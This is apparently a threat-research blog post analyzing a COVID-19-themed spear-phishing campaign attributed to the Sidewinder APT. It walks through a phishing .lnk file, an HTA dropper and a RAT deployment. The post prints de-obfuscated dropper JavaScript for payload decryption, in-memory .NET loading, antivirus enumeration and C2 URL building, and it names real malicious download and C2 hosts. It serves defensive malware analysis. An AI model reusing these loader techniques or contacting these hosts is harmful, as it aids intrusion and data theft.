---
layout: post
title: "Analyzing COVID-19 Themed Attack Campaign by APT Sidewinder"
date: 2020-04-10 06:00:00 +0530
categories: ["threatresearch"]
tags: ["sidewinder","rattlesnake","india","pakistan","covid19","apt"]

---

During the recent spike in COVID-19 themed attacks, cyber-criminals and nation-backed threat actors are using the pandemic as a lure to gain access to critical infrastructure inside organizations.

## Background
Sidewinder a.k.a Rattlesnake is believed to be an Indian state-backed APT group. The threat group actively conducts operations targeting military and governments in Pakistan and China and is believed to be operating since 2012.

## Source of Discovery
The malware sample discovery belongs to the [__RedDrip__](https://twitter.com/RedDrip7) Team who shared two VirusTotal reports.

- [__966029e.hta__](https://www.virustotal.com/gui/file/3d5f133790f807270f6a64743cb593673f820bca4aba406ee08fda1429a340bd/detection)
- [__Cb2e3e0[1].hta__](https://www.virustotal.com/gui/file/d302e75752341090fcc9a04bdf8ae8300cc4746b2c4abf7539daafaae275c1f0/detection)

## Intrusion Point
The initial intrusion point of the attack is a spear-phishing email sent to the target. The email contains an executable .lnk file that fakes itself as a PDF. The victim tries to open the PDF and the malicious .lnk file unintentionally gets executed.

<div><center><img src="/assets/img/posts/2020-04-21-lnk-file.png" title="Spear-Phishing .lnk File"></center></div>
<br>
The malicious .lnk file contains the address of command and control domain. As soon as the file is executed, the embedded command is executed which downloads the stage-1 .hta dropper from `http://www.nrots.net/images/5328C28B/15936/11348/7c8d64e9/e17e25e`.

## Malware Analysis
The malware dropper 966029e.hta contains highly obfuscated JavaScript code which can be divided into 4 blocks for understanding. Each block of code is meant for different purposes during the first phase of attack.

### Decryption Block
The very first function is meant for decoding any base64 string passed to it. The second function consumes an XOR key and a base64 string resulting in decrypted payload. The third function takes a base64 string and sends it to the second function to XOR with a key that is stored in the variable "keeee". Doing an XOR of the hardcoded base64 string "fGNWc3tkXnB0Zg==" with the hardcoded key "MUgF" results in the value of keeee "1615619693" which will be used to de-obfuscate the embedded payload.

```javascript
function YiJr(str){
    var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXY"+"Zabcdefghijklmnopqrstuvwxyz0123456789+/="
    var b, result = "",
       r1, r2, i = 0;
    for (; i < str.length;) {
        b = b64.indexOf(str.charAt(i++)) << 18 | b64.indexOf(str.charAt(i++)) << 12 |
            (r1 = b64.indexOf(str.charAt(i++))) << 6 | (r2 = b64.indexOf(str.charAt(i++)));
        result += r1 === 64 ? vLpfue(b >> 16 & 255) :
            r2 === 64 ? vLpfue(b >> 16 & 255, b >> 8 & 255) :
            vLpfue(b >> 16 & 255, b >> 8 & 255, b & 255);
    }
    return result;
    };
function xStrAmh (key, bytes){
    var res = [];
    for (var i = 0; i < bytes.length; ) {
        for (var j = 0; j < key.length; j++) {
            res.push(vLpfue((bytes.charCodeAt(i)) ^ key.charCodeAt(j)));
            i++;
            if (i >= bytes.length) {
                j = key.length;
            }
        }
    }
    return res.join("")
}
function rBEokCwZ(bsix){
    return xStrAmh(keeee,YiJr(bsix))
}
var keeee = xStrAmh("MUgF",YiJr("fGNW"+"c3tk"+"XnB0"+"Zg=="));
```

### Memory Writing Block
The decryption block decrypts the embedded binary which is loaded into the memory by the memory writing block of the JS script. The following code was decrypted using the functions from the decryption block:

```javascript
function Func4(b) {
    var enc = new ActiveXObject1("System.Text.ASCIIEncoding");
    var length = enc["GetByteCount_2"](b);
    var ba = enc["GetBytes_4"](b);
    var transform = new ActiveXObject1("System.Security.Cryptography.FromBase64Transform");
    ba = transform["TransformFinalBlock"](ba, 0, length);
    var ms = new ActiveXObject1("System.IO.MemoryStream");
    ms.Write(ba, 0, (length / 4) * 3);
    ms.Position = 0;
    dash = ms;
}
```

### Enumeration Block
The enumeration block enumerates the victim machine in an attempt to find the current version of .NET framework installed on it. The following code was decrypted using the functions from the decryption block:

```javascript
var shells = new ActiveXObject1("WScript.Shell");
function tPYpmq(){
    var net = "";
    var FSO = new ActiveXObject1("Scripting.FileSystemObject");
    var folds = FSO.GetFolder(FSO.GetSpecialFolder(0)+"\Microsoft.NET\Framework\ ").SubFolders;
    e = new Enumerator(folds);
    var folder;
    e.moveFirst();   
    while (e.atEnd() == false)  
    {  
        folder = e.item();
        var files = folder.files;
        var fileEnum = new Enumerator(files);
        fileEnum.moveFirst(); 
        while(fileEnum.atEnd() == false){
        if(fileEnum.item().Name == "csc.exe")
        {
            if(folder.Name.substring(0,2)=="v2")
                return "v2.0.50727";
            else if(folder.Name.substring(0,2)=="v4")
                return "v4.0.30319";
            }
            fileEnum[moveNext](); 
        }
        e[moveNext]();
    }
    return folder.Name;
}
ver = v2.0.50727;
try {
    ver = Func5();
} catch(e) { 
    ver = "v2.0.50727";
}
```

### CnC Block
The CnC block collects information about installed anti-virus software and its current status of updates on the victim machine. This information is then used to craft a URL ```http://www.d01fa.net/plugins/16364/11542/true/true/``` to communicate with the command and control server and download the related payload.

```javascript
shells.Environment("Process")(COMPLUS_Version) = ver;;
    var objWMIService = GetObject("winmgmts:\\.\root\SecurityCenter2");
    var colItems = objWMIService.ExecQuery("Select * From AntiVirusProduct", null, 48);
    var objItem = new Enumerator(colItems); 
    var x = "";
    for (; !objItem.atEnd(); objItem[moveNext]()) {
    x += (objItem.item().displayName + " " + objItem.item().productState).replace(" ", "");
    }
    var stm = Func4(so.split(".").join(''));
    var fmt = new ActiveXObject1("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter");
    var al = new ActiveXObject1("System.Collections.ArrayList");
    var d = fmt["Deserialize_2"](dash);
    al.Add(undefined);
    var o = d["DynamicInvoke"](al.ToArray())["CreateInstance"](ec);
    if(x && x.length){
        x = x + "_stg1";
    }
    var aUrl = "http://www.d01fa.net/plugins/16364/11542/true/true/"+x;
```

### Embedded Binary & Decoy
Within the dropper, two variables contain huge encrypted strings. One of the variables contains the stage-2 binary that is decrypted and written directly into the memory. The second variable contains content of a decoy PDF which is decrypted and shown to the victim. Analysis of the binary embedded in the former variable reveals its original name as ___LinkZip.dll___. The binary is a [__DotNetToJScript__](https://github.com/tyranid/DotNetToJScript) converter written by [James Forshaw](https://twitter.com/tiraniddo).

<div><center><img src="/assets/img/posts/2020-04-21-embedded-binary.png" title="Embedded DotNetToJScript Binary"></center></div>
<br>
The dropper also downloads a variant of the malware named [file.hta](https://www.virustotal.com/gui/file/34ab2e72624e808efa66cccb9ea2ec086b02927165dfc00d477cf573ffff2761/detection) for persistence. The decryption mechanism of the __file.hta__ is the same as the .hta dropper and is responsible for dropping the following binaries `C:\ProgramData\`

- [__Duser.dll__](https://www.virustotal.com/gui/file/c69456894fb70e6dfb4ef38bc926f8fc90a82a7b9427f429581a7cee22e09411/detection) - XOR decryptor for file containing the RAT
- SOHYXY.tmp - Encrypted payload decrypted by Duser.dll
- rekeywiz.exe - Windows legit binary
- rekeywiz.conf - configuration file for rekeywiz.conf

_Duser.dll_ decrypts the file named _"SOHYXY.tmp"_ and deploys the RAT for performing reconnaissance on the victim machines. The commands issued by the C2 server are stored in an encrypted file named [__font__](https://www.virustotal.com/gui/file/5e20dcef43ed82e97b881220f0e6971af364874f42849cea6e90030ebbd69f6c/detection). After decryption using the already discussed methodology, the C2 commands are revealed indicating that the stolen information is sent to `cloud-apt.net`
<br>
<br>

---
[___IOCs and YARA Signatures___](https://github.com/ahmadmkhan1/Threat-Research/blob/master/20200410_sidewinder_covid19-themed-attack-to-deploy-RAT.yar)
